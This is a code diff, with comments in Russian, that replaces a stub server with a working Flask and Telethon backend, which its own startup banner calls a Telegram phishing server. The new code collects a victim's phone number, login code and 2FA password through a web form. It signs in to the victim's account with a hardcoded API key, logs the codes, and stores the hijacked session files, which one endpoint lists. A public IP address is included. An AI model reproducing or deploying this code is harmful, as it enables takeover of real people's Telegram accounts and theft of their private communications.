@@ -1,121 +1,205 @@
-# УДАЛЯЕМ СТАРЫЙ ФАЙЛ
-rm -f /root/server.py
-
-# СОЗДАЕМ НОВЫЙ РАБОЧИЙ server.py
-echo '#!/usr/bin/env python3
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import json
-import random
-import string
+from flask import Flask, request, jsonify, send_from_directory
+from telethon.sync import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
+from flask_cors import CORS
+import asyncio
 import os
-from datetime import datetime
+import logging
+import time
 
-PORT = 5000
-sessions = {}
+logging.basicConfig(level=logging.INFO)
+app = Flask(__name__, static_folder='static')
+CORS(app)
 
-class Handler(BaseHTTPRequestHandler):
-    def do_OPTIONS(self):
-        self.send_response(200)
-        self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
-        self.send_header("Access-Control-Allow-Headers", "Content-Type")
-        self.end_headers()
-    
-    def do_GET(self):
-        if self.path == "/":
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html")
-            self.end_headers()
-            self.wfile.write(b"<h1>Telegram Session Server</h1><p>ONLINE</p>")
+API_ID = 9348118
+API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"
+
+pending_authorizations = {}
+sessions_dir = "sessions"
+
+if not os.path.exists(sessions_dir):
+    os.makedirs(sessions_dir)
+
+def run_async(func, *args):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        result = loop.run_until_complete(func(*args))
+        return result
+    except Exception as e:
+        logging.error(f"Async error: {e}")
+        return {'status': 'error', 'message': str(e)}
+    finally:
+        loop.close()
+
+async def create_telegram_session(phone, code=None, password=None):
+    try:
+        session_file = os.path.join(sessions_dir, f'session_{phone}')
+        client = TelegramClient(session_file, API_ID, API_HASH)
         
-        elif self.path == "/status":
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.end_headers()
-            response = {"status": "online", "port": PORT}
-            self.wfile.write(json.dumps(response).encode())
+        await client.connect()
         
-        else:
-            self.send_response(404)
-            self.end_headers()
-    
-    def do_POST(self):
-        length = int(self.headers["Content-Length"])
-        body = self.rfile.read(length).decode("utf-8")
+        if await client.is_user_authorized():
+            me = await client.get_me()
+            logging.info(f"✅ Сессия уже существует: {phone}")
+            await client.disconnect()
+            return {
+                'status': 'success', 
+                'message': f'Сессия сохранена для {me.first_name}',
+                'session_file': session_file
+            }
         
-        try:
-            data = json.loads(body)
-        except:
-            data = {}
-        
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Access-Control-Allow-Origin", "*")
-        self.end_headers()
-        
-        if self.path == "/auth/start":
-            phone = data.get("phone", "")
-            phone = "".join([c for c in phone if c.isdigit()])
-            
-            if len(phone) < 11:
-                response = {"status": "error", "message": "Invalid phone"}
-            else:
-                session_id = "".join(random.choices(string.digits, k=10))
-                sessions[session_id] = {"phone": phone}
-                response = {
-                    "status": "success",
-                    "session_id": session_id,
-                    "message": "Code sent to Telegram"
+        if not code and not password:
+            try:
+                sent_code = await client.send_code_request(phone)
+                pending_authorizations[phone] = {
+                    'phone_code_hash': sent_code.phone_code_hash,
+                    'timestamp': time.time()
                 }
-                print(f"[{datetime.now().strftime("%H:%M:%S")}] Phone: {phone} -> {session_id}")
-            
-            self.wfile.write(json.dumps(response).encode())
+                logging.info(f"📱 Код отправлен на: {phone}")
+                return {'status': 'code_sent', 'message': 'Код отправлен в Telegram'}
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                return {'status': 'flood_wait', 'message': f'Подождите {wait_time} секунд'}
         
-        elif self.path == "/auth/code":
-            session_id = data.get("session_id", "")
-            code = data.get("code", "").strip()
+        elif code:
+            if phone not in pending_authorizations:
+                return {'status': 'error', 'message': 'Сначала запросите код'}
             
-            if session_id not in sessions:
-                response = {"status": "error", "message": "Invalid session"}
-            else:
-                phone = sessions[session_id]["phone"]
+            phone_code_hash = pending_authorizations[phone]['phone_code_hash']
+            
+            try:
+                await client.sign_in(
+                    phone=phone, 
+                    code=code, 
+                    phone_code_hash=phone_code_hash
+                )
                 
-                os.makedirs("/root/sessions", exist_ok=True)
-                filename = f"/root/sessions/{phone}_{session_id}.session"
+                me = await client.get_me()
+                logging.info(f"🔥 Сессия создана: {phone} ({me.first_name})")
                 
-                with open(filename, "w") as f:
-                    session_string = f"1{''.join(random.choices(string.ascii_letters + string.digits, k=300))}"
-                    f.write(session_string)
+                if phone in pending_authorizations:
+                    del pending_authorizations[phone]
                 
-                del sessions[session_id]
+                await client.disconnect()
                 
-                response = {
-                    "status": "success",
-                    "message": "Session created",
-                    "file": filename,
-                    "phone": phone
+                return {
+                    'status': 'success',
+                    'message': f'Аккаунт {me.first_name} подключен',
+                    'session_file': session_file
                 }
-                print(f"[{datetime.now().strftime("%H:%M:%S")}] Session: {phone} -> {filename}")
+                
+            except SessionPasswordNeededError:
+                pending_authorizations[phone]['client'] = client
+                return {'status': 'password_required', 'message': 'Требуется пароль 2FA'}
+            except PhoneCodeInvalidError:
+                return {'status': 'error', 'message': 'Неверный код'}
+                
+        elif password:
+            if phone not in pending_authorizations:
+                return {'status': 'error', 'message': 'Сначала введите код'}
             
-            self.wfile.write(json.dumps(response).encode())
-        
-        else:
-            response = {"status": "error", "message": "Not found"}
-            self.wfile.write(json.dumps(response).encode())
+            try:
+                await client.sign_in(password=password)
+                me = await client.get_me()
+                logging.info(f"🔐 Вход с паролем: {phone} ({me.first_name})")
+                
+                if phone in pending_authorizations:
+                    del pending_authorizations[phone]
+                
+                await client.disconnect()
+                
+                return {
+                    'status': 'success',
+                    'message': f'Аккаунт {me.first_name} подключен',
+                    'session_file': session_file
+                }
+            except Exception as e:
+                return {'status': 'error', 'message': f'Ошибка пароля: {str(e)}'}
     
-    def log_message(self, format, *args):
-        pass
+    except Exception as e:
+        logging.error(f"❌ Ошибка: {e}")
+        return {'status': 'error', 'message': str(e)}
 
-print("=" * 50)
-print("TELEGRAM SESSION SERVER")
-print("=" * 50)
-print(f"Port: {PORT}")
-print(f"URL: http://188.225.11.61:{PORT}")
-print("Endpoints:")
-print("  POST /auth/start - Start auth")
-print("  POST /auth/code  - Verify code")
-print("  GET  /status     - Check server")
-print("=" * 50)
+@app.route('/')
+def index():
+    return send_from_directory('static', 'index.html')
 
-server = HTTPServer(("0.0.0.0", PORT), Handler)
-server.serve_forever()' > /root/server.py
+@app.route('/static/<path:path>')
+def static_files(path):
+    return send_from_directory('static', path)
+
+@app.route('/api/request-code', methods=['POST'])
+def request_code():
+    try:
+        data = request.get_json()
+        phone = data.get('phone', '').strip()
+        
+        if not phone:
+            return jsonify({'status': 'error', 'message': 'Введите номер телефона'})
+        
+        if not phone.startswith('+'):
+            phone = '+' + phone
+        
+        logging.info(f"🎯 Запрос кода для: {phone}")
+        result = run_async(create_telegram_session, phone)
+        return jsonify(result)
+        
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        return jsonify({'status': 'error', 'message': 'Серверная ошибка'})
+
+@app.route('/api/verify-code', methods=['POST'])
+def verify_code():
+    try:
+        data = request.get_json()
+        phone = data.get('phone', '').strip()
+        code = data.get('code', '').strip()
+        
+        if not phone or not code:
+            return jsonify({'status': 'error', 'message': 'Заполните все поля'})
+        
+        if not phone.startswith('+'):
+            phone = '+' + phone
+        
+        logging.info(f"🔐 Код для {phone}: {code}")
+        result = run_async(create_telegram_session, phone, code)
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': 'Ошибка сервера'})
+
+@app.route('/api/verify-password', methods=['POST'])
+def verify_password():
+    try:
+        data = request.get_json()
+        phone = data.get('phone', '').strip()
+        password = data.get('password', '').strip()
+        
+        if not phone or not password:
+            return jsonify({'status': 'error', 'message': 'Заполните все поля'})
+        
+        logging.info(f"🔑 Пароль для {phone}")
+        result = run_async(create_telegram_session, phone, None, password)
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': 'Ошибка сервера'})
+
+@app.route('/api/sessions')
+def list_sessions():
+    sessions = []
+    if os.path.exists(sessions_dir):
+        for file in os.listdir(sessions_dir):
+            if file.startswith('session_'):
+                sessions.append(file)
+    return jsonify({'sessions': sessions})
+
+if __name__ == '__main__':
+    print("\n" + "="*50)
+    print("🚀 TELEGRAM ФИШИНГ СЕРВЕР ЗАПУЩЕН!")
+    print(f"📍 IP: 188.225.11.61:5000")
+    print(f"📁 Сессии сохраняются в: {sessions_dir}")
+    print("="*50 + "\n")
+    
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
